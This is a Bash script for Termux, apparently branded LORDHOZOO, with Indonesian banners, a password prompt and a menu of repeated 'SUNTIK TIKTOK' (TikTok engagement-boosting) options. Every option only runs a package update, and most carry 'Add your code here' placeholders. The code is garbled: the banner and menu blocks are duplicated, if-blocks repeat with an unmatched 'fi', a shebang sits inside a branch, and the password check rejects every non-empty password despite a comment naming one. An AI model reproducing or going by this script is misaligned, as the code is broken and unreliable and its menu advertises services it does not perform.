echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    pkg update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    pkg update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    pkg update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    pkg update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    pkg update
fi



if [ "$updt" -eq 30 ]; then
    # Add your code here for option 30
    apt update -y
    clear
    RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
blue='\033[34;1m'
green='\033[32;1m'
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m'
yellow='\033[33;1m'
clear
pkg install mpv -y
clear
apt install mpv -y
clear
mpv --no-video --volume=80 PHONK.mp3 &>/dev/null & disown
function loading_animation() {
    local pid=$1
    local delay=1
    local spinstr='|/-\'
    
    echo -n "Memproses "
    while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
        local temp=${spinstr#?}
        printf " [%c]  " "$spinstr"
        local spinstr=$temp${spinstr%"$temp"}
        sleep $delay
        printf "\b\b\b\b\b\b"
    done
    printf "    \b\b\b\b"
}

# Meminta password
echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │" 
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
echo -e "Masukkan Password untuk menjalankan tools: "
read -s password
echo

# Cek password (contoh password "rahasia")
if [ "$password" != "" ]; then
    echo "Password salah! Tools tidak dijalankan."
    exit 1
fi

# Proses yang membutuhkan loading
(
    # Simulasi proses yang memakan waktu
    sleep 3
) &

loading_animation $!

echo -e "\nTools berhasil dijalankan! 👰 Sukses"
clear
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
PURPLE='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m'

# Animation function
animate() {
    local text="$1"
    for ((i=0; i<${#text}; i++)); do
        echo -n "${text:$i:1}"
         done
    echo
}

echo -e " \033[31;1m █░░ █▀█ █▀█ █▀▄ █░█ █▀█ ▀█ █▀█ █▀█"
echo -e " \033[37;1m █▄▄ █▄█ █▀▄ █▄▀ █▀█ █▄█ █▄ █▄█ █▄█ \033[31;1m V 1.0.1 "
echo -e "\033[37;1m┌──────────────────────────────────────────────────────────────┐ $white"
echo -e "│ $white AUTHOR   : LORDHOZOO                                        │"
echo -e "│ $white DILIRIS  : 2025-10-10 MEI SABTU                             │"
echo -e "│ $white YOUTUBE  : LORDHOZOO                                        │"
echo -e "│ $white TIKTOK   : LORDHOZOO                                        │"
echo -e "│ $white STATUS   : $green ONLINE                                       $white   │ $white "
echo -e "└──────────────────────────────────────────────────────────────┘ $white"
# Menu options
echo -e "${GREEN}╔═══════════════════════════════════════╗"      
echo -e "║          👸  LORDHOZOO 👸             ${GREEN}║"
echo -e "╠═══════════════════════════════════════╣"
echo -e "║ ${YELLOW}[01]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[02]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[03]${NC}. SUNTIK TIKTOK                   ${GREEN}║"
echo -e "║ ${YELLOW}[04]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[05]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[06]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[07]${NC}.  SUNTIK TIKTOK                  ${GREEN}║"
echo -e "║ ${YELLOW}[08]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[09]${NC}. MENU  SUNTIK TIKTOK             ${GREEN}║"
echo -e "║ ${YELLOW}[10]${NC}. MENU SUNTIK TIKTOK              ${GREEN}║"
echo -e "║ ${YELLOW}[11]${NC}. LAPOR BUG                       ${GREEN}║"
echo -e "║ ${YELLOW}[12]${NC}. YOUUTUBE : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[13]${NC}. TIKTOK   : LORDHOZOO            ${GREEN}║"
echo -e "║ ${YELLOW}[14]${NC}. ABOUT ME                        ${GREEN}║"
echo -e "║ ${YELLOW}[15]${NC}. Exit                            ${GREEN}║"
echo -e "╚═══════════════════════════════════════╝${NC}"
echo -e "${PURPLE} ╭─ROOT@LORDHOZOO@localhost /home"


read -p "$(echo -e ${PURPLE}" ╰─$: "${NC})" updt

# data
if [ "$updt" -eq 1 ] || [ "$updt" -eq 01 ]; then
    # Add your code here for option 1
    pkg update
    #!/bin/bash


fi

if [ "$updt" -eq 2 ] || [ "$updt" -eq 02 ]; then
    # Add your code here for option 2
    pkg update
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    pkg update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    pkg update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    pkg update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    pkg update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    pkg update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    pkg update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    pkg update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    pkg update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    pkg update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    apt  update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    apt update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    apt update
fi



if [ "$updt" -eq 31 ]; then
    # Add your code here for option 31
    apt  update
fi

if [ "$updt" -eq 32 ]; then
    # Add your code here for option 32
    apt update
fi

if [ "$updt" -eq 33 ]; then
    # Add your code here for option 33
    apt  update
fi

if [ "$updt" -eq 34 ]; then
    # Add your code here for option 34
    apt  update
fi

if [ "$updt" -eq 35 ]; then
    # Add your code here for option 35
    apt update
fi

if [ "$updt" -eq 36 ]; then
    # Add your code here for option 36
    apt update
fi

if [ "$updt" -eq 37 ]; then
    # Add your code here for option 37
    apt update
fi

if [ "$updt" -eq 38 ]; then
    # Add your code here for option 38
    apt update
fi

if [ "$updt" -eq 39 ]; then
    # Add your code here for option 39
    apt update
fi

if [ "$updt" -eq 40 ]; then
    # Add your code here for option 40
  apt  update
fi

if [ "$updt" -eq 41 ]; then
    # Add your code here for option 41
    apt update
fi

if [ "$updt" -eq 42 ]; then
    # Add your code here for option 42
    apt update
fi

if [ "$updt" -eq 43 ]; then
    # Add your code here for option 43
    apt update
fi

if [ "$updt" -eq 44 ]; then
    # Add your code here for option 44
    apt  update
fi

if [ "$updt" -eq 45 ]; then
    # Add your code here for option 45
    apt  update
fi

if [ "$updt" -eq 46 ]; then
    # Add your code here for option 46
    apt update
fi

if [ "$updt" -eq 47 ]; then
    # Add your code here for option 47
  apt update
fi

if [ "$updt" -eq 48 ]; then
    # Add your code here for option 48
    apt  update
fi

if [ "$updt" -eq 49 ]; then
    # Add your code here for option 49
    apt  update
fi

if [ "$updt" -eq 50 ]; then
    # Add your code here for option 50
    apt update
fi
fi

if [ "$updt" -eq 3 ] || [ "$updt" -eq 03 ]; then
    # Add your code here for option 3
    apt update
fi

if [ "$updt" -eq 4 ] || [ "$updt" -eq 04 ]; then
    # Add your code here for option 4
    apt update
fi

if [ "$updt" -eq 5 ] || [ "$updt" -eq 05 ]; then
    # Add your code here for option 5
    apt  update
fi

if [ "$updt" -eq 6 ] || [ "$updt" -eq 06 ]; then
    # Add your code here for option 6
    apt update
fi

if [ "$updt" -eq 7 ] || [ "$updt" -eq 07 ]; then
    # Add your code here for option 7
    apt  update
fi

if [ "$updt" -eq 8 ] || [ "$updt" -eq 08 ]; then
    # Add your code here for option 8
    apt  update
fi

if [ "$updt" -eq 9 ] || [ "$updt" -eq 09 ]; then
    # Add your code here for option 9
    apt  update
fi

if [ "$updt" -eq 10 ]; then
    # Add your code here for option 10
    apt update
fi

if [ "$updt" -eq 11 ]; then
    # Add your code here for option 11
    apt update
fi

if [ "$updt" -eq 12 ]; then
    # Add your code here for option 12
    apt update
fi

if [ "$updt" -eq 13 ]; then
    # Add your code here for option 13
    apt update
fi

if [ "$updt" -eq 14 ]; then
    # Add your code here for option 14
    apt  update
fi

if [ "$updt" -eq 15 ]; then
    # Add your code here for option 15
    apt update
fi

if [ "$updt" -eq 16 ]; then
    # Add your code here for option 16
    apt  update
fi

if [ "$updt" -eq 17 ]; then
    # Add your code here for option 17
    apt  update
fi

if [ "$updt" -eq 18 ]; then
    # Add your code here for option 18
    apt update
fi

if [ "$updt" -eq 19 ]; then
    # Add your code here for option 19
    apt update
fi

if [ "$updt" -eq 20 ]; then
    # Add your code here for option 20
    apt  update
fi

if [ "$updt" -eq 21 ]; then
    # Add your code here for option 21
    apt  update
fi

if [ "$updt" -eq 22 ]; then
    # Add your code here for option 22
    apt  update
fi

if [ "$updt" -eq 23 ]; then
    # Add your code here for option 23
    apt  update
fi

if [ "$updt" -eq 24 ]; then
    # Add your code here for option 24
    apt update
fi

if [ "$updt" -eq 25 ]; then
    # Add your code here for option 25
    apt update
fi

if [ "$updt" -eq 26 ]; then
    # Add your code here for option 26
  apt  update
fi

if [ "$updt" -eq 27 ]; then
    # Add your code here for option 27
    apt update
fi

if [ "$updt" -eq 28 ]; then
    # Add your code here for option 28
    apt  update
fi

if [ "$updt" -eq 29 ]; then
    # Add your code here for option 29
    apt update
fi

if [ "$updt" -eq 30 ]; then
    # Add your code here for option 30
    apt update
fi

if [ "$updt" -eq 31 ]; then
    # Add your code here for option 31
    apt update
fi

if [ "$updt" -eq 32 ]; then
    # Add your code here for option 32
    apt  update
fi

if [ "$updt" -eq 33 ]; then
    # Add your code here for option 33
    apt  update
fi

if [ "$updt" -eq 34 ]; then
    # Add your code here for option 34
    apt  update
fi

if [ "$updt" -eq 35 ]; then
    # Add your code here for option 35
    apt update
fi

if [ "$updt" -eq 36 ]; then
    # Add your code here for option 36
    apt  update
fi

if [ "$updt" -eq 37 ]; then
    # Add your code here for option 37
    apt update
fi

if [ "$updt" -eq 38 ]; then
    # Add your code here for option 38
    apt update
fi

if [ "$updt" -eq 39 ]; then
    # Add your code here for option 39
    apt update
fi

if [ "$updt" -eq 40 ]; then
    # Add your code here for option 40
    apt update
fi

if [ "$updt" -eq 41 ]; then
    # Add your code here for option 41
    apt  update
fi

if [ "$updt" -eq 42 ]; then
    # Add your code here for option 42
    apt update
fi

if [ "$updt" -eq 43 ]; then
    # Add your code here for option 43
    apt  update
fi

if [ "$updt" -eq 44 ]; then
    # Add your code here for option 44
    apt  update
fi

if [ "$updt" -eq 45 ]; then
    # Add your code here for option 45
    apt update
fi

if [ "$updt" -eq 46 ]; then
    # Add your code here for option 46
    apt update
fi

if [ "$updt" -eq 47 ]; then
    # Add your code here for option 47
    apt  update
fi

if [ "$updt" -eq 48 ]; then
    # Add your code here for option 48
    apt  update
fi

if [ "$updt" -eq 49 ]; then
    # Add your code here for option 49
    apt update -y
fi

if [ "$updt" -eq 50 ]; then
    # Add your code here for option 50
    apt  update -y 
fi
